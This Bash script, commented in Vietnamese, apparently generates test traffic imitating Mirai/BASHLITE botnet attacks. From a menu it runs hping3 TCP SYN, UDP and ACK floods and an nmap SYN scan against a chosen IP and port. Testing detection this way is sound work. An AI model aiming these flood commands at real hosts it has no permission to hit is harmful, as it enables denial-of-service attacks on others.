#!/usr/bin/env bash
# ==============================================================================
# test_attacks_kali.sh
# Kịch bản kiểm thử tấn công thực tế từ Kali Linux / Máy tấn công
# Sử dụng công cụ chuẩn: hping3, nmap
# ==============================================================================

TARGET_IP="${1:-127.0.0.1}"
TARGET_PORT="${2:-80}"

echo "======================================================================"
echo "    BỘ KỊCH BẢN KIỂM THỬ TẤN CÔNG BOTNET IOT (MIRAI / BASHLITE)       "
echo "    Mục tiêu: ${TARGET_IP}:${TARGET_PORT}                             "
echo "======================================================================"
echo "1) Kịch bản 1: Mirai TCP SYN Flood (hping3)"
echo "2) Kịch bản 2: Mirai UDP Flood (hping3)"
echo "3) Kịch bản 3: Mirai TCP ACK Flood (hping3)"
echo "4) Kịch bản 4: Mirai Reconnaissance Port Scan (nmap)"
echo "5) Thoát"
echo "----------------------------------------------------------------------"
read -p "Chọn kịch bản muốn kiểm thử (1-4): " choice

case $choice in
  1)
    echo "[!] Đang gửi TCP SYN Flood vào ${TARGET_IP}:${TARGET_PORT} trong 10 giây..."
    sudo timeout 10s hping3 -S -p "${TARGET_PORT}" --flood "${TARGET_IP}" || true
    echo "[V] Hoàn tất đợt tấn công SYN Flood."
    ;;
  2)
    echo "[!] Đang gửi UDP Flood vào ${TARGET_IP}:${TARGET_PORT} (Payload 512 bytes) trong 10 giây..."
    sudo timeout 10s hping3 --udp -d 512 -p "${TARGET_PORT}" --flood "${TARGET_IP}" || true
    echo "[V] Hoàn tất đợt tấn công UDP Flood."
    ;;
  3)
    echo "[!] Đang gửi TCP ACK Flood vào ${TARGET_IP}:${TARGET_PORT} trong 10 giây..."
    sudo timeout 10s hping3 -A -p "${TARGET_PORT}" --flood "${TARGET_IP}" || true
    echo "[V] Hoàn tất đợt tấn công ACK Flood."
    ;;
  4)
    echo "[!] Đang thực hiện quét cổng Mirai Port Scan (nmap -sS)..."
    sudo nmap -sS -T4 -p 1-100 "${TARGET_IP}"
    echo "[V] Hoàn tất đợt quét cổng."
    ;;
  *)
    echo "Thoát chương trình."
    ;;
esac
